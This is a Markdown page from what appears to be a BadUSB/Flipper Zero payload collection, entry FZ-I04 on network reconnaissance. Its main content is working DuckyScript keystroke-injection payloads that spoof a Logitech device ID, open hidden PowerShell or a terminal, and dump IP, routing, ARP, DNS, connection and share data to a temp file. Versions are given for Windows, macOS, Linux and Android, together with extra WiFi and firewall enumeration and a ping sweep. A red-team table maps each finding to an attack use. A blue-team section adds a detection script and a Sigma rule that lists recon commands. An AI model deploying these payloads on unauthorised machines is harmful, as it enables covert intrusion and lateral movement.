# FZ-I04: Network Reconnaissance

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-I04 |
| **Name** | Network Reconnaissance |
| **Difficulty** | Intermediate |
| **Target OS** | Windows 10/11 |
| **Execution Time** | ~12 seconds |
| **Output** | %TEMP%\network.txt |
| **MITRE ATT&CK** | T1016 (System Network Configuration Discovery) |

## What This Payload Does

Performs comprehensive network reconnaissance including IP configuration, routing tables, ARP cache, DNS cache, active connections, and network shares. Essential for understanding the target's network position.

---

## The Payload

```ducky
REM =============================================
REM INTERMEDIATE: Network Reconnaissance
REM Target: Windows 10/11
REM Action: Full network enumeration
REM Output: %TEMP%\network.txt
REM Skill: Intermediate
REM =============================================

ID 046d:c52b Logitech:Unifying Receiver

DELAY 2500

REM Open hidden PowerShell
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1500

REM Comprehensive network enumeration
STRINGLN $n = @()
STRINGLN $n += "=== NETWORK RECONNAISSANCE ==="
STRINGLN $n += "Generated: $(Get-Date)"
STRINGLN $n += ""

REM IP Configuration
STRINGLN $n += "=== IP CONFIGURATION ==="
STRINGLN $n += (ipconfig /all | Out-String)

REM Routing Table
STRINGLN $n += "=== ROUTING TABLE ==="
STRINGLN $n += (route print | Out-String)

REM ARP Cache
STRINGLN $n += "=== ARP CACHE ==="
STRINGLN $n += (arp -a | Out-String)

REM DNS Cache
STRINGLN $n += "=== DNS CACHE (Sample) ==="
STRINGLN $n += (Get-DnsClientCache | Select-Object -First 20 | Out-String)

REM Active Connections
STRINGLN $n += "=== ACTIVE CONNECTIONS ==="
STRINGLN $n += (netstat -an | Out-String)

REM Network Shares
STRINGLN $n += "=== NETWORK SHARES ==="
STRINGLN $n += (net share | Out-String)

STRINGLN $n | Out-File "$env:TEMP\network.txt"
STRINGLN exit
```

---

## Information Gathered

### IP Configuration Details

| Data Point | Intelligence Value |
|------------|-------------------|
| IP Address | Target identification |
| Subnet Mask | Network size calculation |
| Default Gateway | Router identification |
| DNS Servers | DNS infrastructure |
| DHCP Server | Network management |
| MAC Address | Physical device ID |
| Domain Suffix | Domain membership |

### Routing Table

```
Network Destination    Netmask          Gateway         Interface
0.0.0.0               0.0.0.0          192.168.1.1     192.168.1.50
10.0.0.0              255.0.0.0        192.168.1.1     192.168.1.50
192.168.1.0           255.255.255.0    On-link         192.168.1.50
```

Reveals:
- Default route (internet access)
- Internal network routes
- VPN connections (additional routes)

### ARP Cache

```
Interface: 192.168.1.50
  Internet Address      Physical Address      Type
  192.168.1.1          aa-bb-cc-dd-ee-ff     dynamic
  192.168.1.100        11-22-33-44-55-66     dynamic
```

Shows recently contacted devices on the local network.

---

## Cross-Platform Versions

### macOS

```ducky
DELAY 2500
GUI SPACE
DELAY 700
STRING terminal
ENTER
DELAY 1500
STRINGLN {
STRINGLN echo "=== NETWORK RECON ===" > /tmp/network.txt
STRINGLN echo "=== INTERFACES ===" >> /tmp/network.txt
STRINGLN ifconfig >> /tmp/network.txt
STRINGLN echo "=== ROUTING ===" >> /tmp/network.txt
STRINGLN netstat -rn >> /tmp/network.txt
STRINGLN echo "=== ARP ===" >> /tmp/network.txt
STRINGLN arp -a >> /tmp/network.txt
STRINGLN echo "=== DNS ===" >> /tmp/network.txt
STRINGLN scutil --dns >> /tmp/network.txt
STRINGLN echo "=== CONNECTIONS ===" >> /tmp/network.txt
STRINGLN netstat -an | head -50 >> /tmp/network.txt
STRINGLN } 2>/dev/null
```

### Linux

```ducky
DELAY 2500
CTRL ALT t
DELAY 1000
STRINGLN {
STRINGLN echo "=== NETWORK RECON ===" > /tmp/network.txt
STRINGLN echo "=== INTERFACES ===" >> /tmp/network.txt
STRINGLN ip addr >> /tmp/network.txt
STRINGLN echo "=== ROUTING ===" >> /tmp/network.txt
STRINGLN ip route >> /tmp/network.txt
STRINGLN echo "=== ARP ===" >> /tmp/network.txt
STRINGLN ip neigh >> /tmp/network.txt
STRINGLN echo "=== DNS ===" >> /tmp/network.txt
STRINGLN cat /etc/resolv.conf >> /tmp/network.txt
STRINGLN echo "=== CONNECTIONS ===" >> /tmp/network.txt
STRINGLN ss -tulpn >> /tmp/network.txt
STRINGLN echo "=== LISTENING ===" >> /tmp/network.txt
STRINGLN netstat -tlnp 2>/dev/null >> /tmp/network.txt
STRINGLN } 2>/dev/null
```

### Android (via Termux)

```ducky
DELAY 4000
GUI
DELAY 1000
STRING termux
ENTER
DELAY 3000
STRINGLN echo "=== ANDROID NETWORK ===" > /sdcard/network.txt
STRINGLN ip addr >> /sdcard/network.txt
STRINGLN ip route >> /sdcard/network.txt
STRINGLN cat /etc/resolv.conf 2>/dev/null >> /sdcard/network.txt
STRINGLN getprop | grep -i wifi >> /sdcard/network.txt
STRINGLN getprop | grep -i dhcp >> /sdcard/network.txt
```

### iOS (Limited)

```ducky
DELAY 5000
GUI SPACE
DELAY 1500
STRING settings
ENTER
DELAY 3000
REM Navigate to WiFi settings manually
REM iOS doesn't allow network enumeration via keyboard
REM Can only view current connection in Settings app
```

---

## Network Commands Reference

### Windows

| Command | Information |
|---------|-------------|
| `ipconfig /all` | Full IP configuration |
| `route print` | Routing table |
| `arp -a` | ARP cache |
| `netstat -an` | All connections |
| `netstat -b` | Connections with process names |
| `net share` | Shared folders |
| `net view` | Network computers |
| `nslookup` | DNS queries |

### macOS/Linux

| Command | Information |
|---------|-------------|
| `ifconfig` / `ip addr` | Interface configuration |
| `netstat -rn` / `ip route` | Routing table |
| `arp -a` / `ip neigh` | ARP cache |
| `netstat -an` / `ss -tulpn` | Connections |
| `cat /etc/resolv.conf` | DNS configuration |

---

## Red Team Perspective

### Intelligence Value

| Discovery | Attack Use |
|-----------|------------|
| Internal IP range | Scope of lateral movement |
| Gateway IP | Router targeting |
| DNS servers | DNS poisoning targets |
| ARP entries | Live hosts on segment |
| Active connections | Running services |
| Network shares | Data exfiltration paths |
| VPN routes | Additional networks |

### Attack Chain

```
Network Recon → Host Discovery → Service Enumeration → Exploitation
      ↑
  You are here
```

### Enhanced Reconnaissance

```ducky
REM Include nearby WiFi networks
STRINGLN netsh wlan show networks mode=bssid | Out-File "$env:TEMP\wifi_networks.txt"

REM Include firewall rules
STRINGLN Get-NetFirewallRule | Where-Object {$_.Enabled -eq 'True'} | Out-File "$env:TEMP\firewall.txt"

REM Check for VPN adapters
STRINGLN Get-NetAdapter | Where-Object {$_.InterfaceDescription -match 'VPN|TAP|TUN'} | Out-File "$env:TEMP\vpn.txt"
```

---

## Blue Team Perspective

### Detection Opportunities

1. **Command Execution**
   - Multiple network enumeration commands
   - ipconfig, netstat, arp, route in sequence

2. **Process Behavior**
   - Hidden PowerShell running network commands
   - Non-admin tools performing recon

3. **Timing Patterns**
   - Multiple commands in rapid succession
   - Unusual time of execution

### Detection Script

```powershell
# Detect network reconnaissance patterns
$events = Get-WinEvent -FilterHashtable @{
    LogName='Security'
    Id=4688
} -MaxEvents 1000

$reconCommands = @('ipconfig', 'netstat', 'arp', 'route', 'net share', 'net view')
$suspicious = $events | Where-Object {
    $reconCommands | Where-Object { $events.Message -match $_ }
}

if ($suspicious.Count -gt 3) {
    Write-Warning "Possible network reconnaissance detected"
}
```

### Sigma Rule

```yaml
title: Network Reconnaissance Activity
status: experimental
description: Detects multiple network enumeration commands
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        CommandLine|contains:
            - 'ipconfig'
            - 'netstat'
            - 'arp -a'
            - 'route print'
            - 'net share'
            - 'net view'
    timeframe: 5m
    condition: selection | count() > 3
level: medium
tags:
    - attack.discovery
    - attack.t1016
```

### Prevention

1. **Network Segmentation**
   - Limit lateral movement paths
   - Restrict network visibility

2. **Monitoring**
   - Alert on reconnaissance patterns
   - Network traffic analysis

3. **Access Control**
   - Restrict who can view network config
   - Limit admin tool access

---

## Practice Exercises

### Exercise 1: Find Default Gateway
Extract just the default gateway:
```ducky
STRINGLN (Get-NetRoute -DestinationPrefix '0.0.0.0/0').NextHop
```

### Exercise 2: Count Network Connections
Count active TCP connections:
```ducky
STRINGLN (netstat -an | Select-String 'ESTABLISHED').Count
```

### Exercise 3: Find Domain Controllers
Identify domain controllers if domain-joined:
```ducky
STRINGLN [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
```

### Exercise 4: Ping Sweep (Careful - Noisy)
```ducky
STRINGLN 1..254 | ForEach-Object { Test-Connection -ComputerName "192.168.1.$_" -Count 1 -Quiet -ErrorAction SilentlyContinue | Where-Object {$_} | ForEach-Object { "192.168.1.$_" }}
```

---

## Payload File

Save as `FZ-I04_Network_Reconnaissance.txt`:

```ducky
REM FZ-I04: Network Reconnaissance
ID 046d:c52b Logitech:Unifying Receiver
DELAY 2500
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1500
STRINGLN $n=@();$n+=(ipconfig /all);$n+=(route print);$n+=(arp -a);$n+=(netstat -an|Select -First 50);$n+=(net share);$n|Out-File "$env:TEMP\network.txt";exit
```

---

[← FZ-I03 Browser Data Locator](FZ-I03_Browser_Data_Locator.md) | [Back to Intermediate](README.md) | [Next: FZ-I05 User Enumeration →](FZ-I05_User_Enumeration.md)
